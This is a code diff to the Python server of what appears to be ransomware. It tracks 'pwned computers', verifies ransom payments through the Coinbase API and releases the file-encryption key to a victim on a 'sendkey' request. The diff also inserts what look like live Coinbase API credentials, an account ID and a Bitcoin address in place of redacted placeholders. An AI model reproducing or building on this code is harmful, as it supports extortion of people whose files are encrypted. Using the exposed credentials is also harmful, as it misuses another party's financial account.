@@ -9,8 +9,8 @@ from coinbase.wallet.client import Client
 SERVER_ADDRESS = ('0.0.0.0', 17694)
 client_list = []
 information_list = []
-with open("communication_encryption_key.txt", 'rb') as file:
-    SYMMETRIC_KEY = file.read()
+with open("communication_encryption_key.txt", 'rb') as communication_key_file:
+    SYMMETRIC_KEY = communication_key_file.read()
 my_server_socket = socket(AF_INET, SOCK_STREAM)
 
 my_server_socket.bind(SERVER_ADDRESS)
@@ -39,10 +39,10 @@ class Listen(threading.Thread):
 
 def check_payment(transaction_id):
     # you think i'm dumb enough to upload my api_secret and my account id? you tripping.
-    api_key = '*'
-    api_secret = '*'
-    account_id = "*"
-    my_address = "*"
+    api_key = 'ixhbHrVaDtbmlQQJ'
+    api_secret = 'bwlPbxI86g8BSnp7TKb6eFMW47n40B92'
+    account_id = "ce4c1a1f-65a4-5098-b6ac-b2f0f16f603f"
+    my_address = "37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv"
     # ["to"]["address"]
     client = Client(api_key, api_secret)
     transaction = client.get_transaction(account_id, transaction_id)
@@ -67,9 +67,15 @@ class Communicate(threading.Thread):
                     data = current_socket.recv(1024)
                     if data:
                         data = self.fernet.decrypt(data).decode()
-                        can_decrypt = check_payment(data)
-                        data_tosend = self.fernet.encrypt(pickle.dumps(can_decrypt))
-                        current_socket.send(data_tosend)
+                        if data != "sendkey":
+                            can_decrypt = check_payment(data)
+                            data_tosend = self.fernet.encrypt(pickle.dumps(can_decrypt))
+                            current_socket.send(data_tosend)
+                        else:
+                            with open("file_encryption_key.txt", 'rb') as key_file:
+                                key = key_file.read()
+                            data_tosend = self.fernet.encrypt(key)
+                            current_socket.send(data_tosend)
 
 
 class ControlPanel(threading.Thread):
@@ -90,6 +96,8 @@ class ControlPanel(threading.Thread):
                 print("""Available commands are: 
                 showlist - shows a list of ip addresses and hostnames of pwned computers
                 help - shows help
+                quit - quits the server
+                clear - clears the terminal
                 -----------------
                 More commands coming soon !
                 """)
@@ -102,6 +110,13 @@ class ControlPanel(threading.Thread):
                 else:
                     for hostname, address in information_list:
                         print(f"{hostname}     |      {address}")
+            elif command == "quit":
+                quit()
+            elif command == "clear":
+                for i in range(100):
+                    print("\n")
+            else:
+                print(f"\nKnown command: {command}. Try Again! \nFor list of command enter help.\n")
 
 
 listen = Listen(server_socket=my_server_socket, symmetric_key=SYMMETRIC_KEY)
